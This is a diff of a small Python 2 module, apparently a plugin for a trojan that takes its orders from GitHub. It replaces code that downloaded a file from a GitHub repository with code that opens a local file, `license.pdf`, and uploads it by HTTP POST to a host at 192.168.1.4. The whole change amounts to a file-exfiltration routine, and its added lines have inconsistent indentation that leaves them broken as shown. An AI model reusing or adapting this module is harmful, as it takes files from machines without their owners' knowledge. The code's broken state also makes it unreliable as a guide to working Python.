@@ -1,19 +1,11 @@
 import requests
-
 def run(**args):
   try:
-     print("[*] reading")
-   
-     goodie = "test"
-     url = 'https://github.com/experiment2016/workhub/raw/master/test'
-     r = requests.get(url, stream=True)
-
-     with open(goodie, 'wb') as fd:
-         for chunk in r.iter_content(chunk_size=1024):
-             fd.write(chunk)
-     fd.close()
-     te = "ok"
-     return str(te)
-     
+      print("Testing") 
+      goodie = "license.pdf"
+     # url='https://github.com/experiment2016/workhub/tree/master/data/post'
+      url='https://192.168.1.4:8000/post'
+      files = {'upload_file': open(goodie,'rb')}
+      r=requests.post(url,files=files)
   except Exception, e:
       return str(e)
